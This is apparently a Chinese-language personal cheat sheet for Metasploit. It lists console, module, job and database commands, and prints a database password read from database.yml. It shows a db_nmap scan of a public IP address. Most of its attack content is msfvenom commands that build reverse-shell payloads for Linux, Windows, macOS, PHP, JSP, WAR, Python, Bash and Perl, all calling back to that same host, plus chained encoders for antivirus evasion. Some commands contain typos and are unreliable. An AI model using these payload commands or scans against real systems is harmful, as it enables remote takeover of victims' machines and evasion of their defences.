#### 核心命令

```
?		帮助菜单
banner	修改一个横幅
cd		修改一个工作目录
color	颜色输出
connect 连接
debug	调试
exit	退出
features 查看新特性
get		获取上下文变量	
getg 	获取全局变量
grep
help 查看帮助
history 历史命令
load
quit 退出控制台
repeat 重复一个命令列表
route 通过会话的路由流量
save 保存活动数据存储
sessions 转存储会话,并显示详细信息
set 将上下文特定变量设置为一个值
setg 设置一个全局变量
sleep 对于制定的秒数 不做任何事情
spool 将控制台的输入写入文件以及屏幕
threads 查看和操作后台进程
tips  显示有用的生产力提示列表
unlod 卸载框架插件
unset 取消一个特定变量值
unsetg 取消一个多个全局变量的值
version 显示框架和控制台版本号
```

#### 模块的命令

```
advanced
back  退出当前模块
clearm 清除模块堆栈
info   显示一个或者多个模块的详细信息
listm   列出模块堆栈
loadpath 从路径搜索和加载模块
options  显示一个或者多个模块的全局选项
opom 从堆栈中弹出最新的模块并使其处于活动状态
previous  将先前加载的模块设置为当前模块
pushm
reload_all
search
show
use
```

#### 工作命令

```
handler
jobs 显示和管理作业
kill 杀死一个作业
rename_hob 重命名一个作业

```

#### 资源脚本命令

```
makerc 将自开始依赖
resource 资源运行储存在文件中的命令
```

#### 数据库后端命令

```
analyze		分析关于特定地址的数据库信息
db_connect	连接数据库
db_disconnect断开数据库
db_export
db_namp
db_rebuild_cache
db_remove
db_status	是否连接posttgresql数据库
hosts
loot
notes
services
vulns
workspace
```



#### 凭证后端命令

```
creds
```

### msf的扫描功能

#### 查看数据库配置信息

```
cat /opt/metasploit-framework/embedded/framework/config/database.yml
UE+BLPyl0Pwd+uV+At1KlZfnyQ+VWSeoBPt/GuuunOk=
db_connect msf:UE+BLPyl0Pwd+uV+At1KlZfnyQ+VWSeoBPt/GuuunOk=
db_status
```

![image-20200904163115974](https://blo-g.oss-cn-beijing.aliyuncs.com/mkdir/image-20200904163115974.png)

![image-20200904163631206](https://blo-g.oss-cn-beijing.aliyuncs.com/mkdir/image-20200904163631206.png)

#### 扫描功能

```
db_nmap -Pn 120.92.211.101
```

```
#扫描模块--通用的
search scanner
use auxiliary/scanner/portscan/tcp
设置参数步骤
```

#### msfvenom

```
p 指定payload
l 列出所有payload
n 设置payload大小
f 指定两种格式输出
e 使用编码器
a 精确的使用编码器
s 指定最大多少
b 减少体积
i 指定编码次数
c捆绑
o指定输出位置
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=120.92.211.101 lport=8021  -f elf > test.elf
msfvenom -p windows/meterpreter/reverse_tcp lhost=120.92.211.101 lport=8021 -f exe > test.exe
msfvenom -p osx/x86/shell_reverse_tcp lhost=120.92.211.101 lport=8021 -f macho > test.macho
msfvenom -p php/meterpreter_reverse_tcp lhost=120.92.211.101 lport=8021 -f raw > test.php
msfvenom -p java/jsp_shell_reverse_tcp lhost=120.92.211.101 lport=8021 -f raw > test.jsp
msfvenom -p java/jsp_shell_reverse_tcp lhost=120.92.211.101 lport=8021 -f raw > test.war
msfvenom -p cmd/unix/reverse_python lhost=120.92.211.101 lport=8021 -f raw > test.py
msfvenom -p cmd/unix/reverse_bash lhost=120.92.211.101 lport=8021 -f raw > test.sh
msfverom -p cmd/unix/reverese_perl lhost=120.92.211.101 lport=8021 -f raw > test.pl
多编码加密 
Msfvenom -p windows/meterpreter/reverse_tcp    -f  raw    -e 
x86/jmp_call_additive LHOST=IP> | msfvenom -e x86/shikata_ga_nai -a x86 – 
platform windows -f exe > 1.exe
```

#### 捆绑技术生成

省



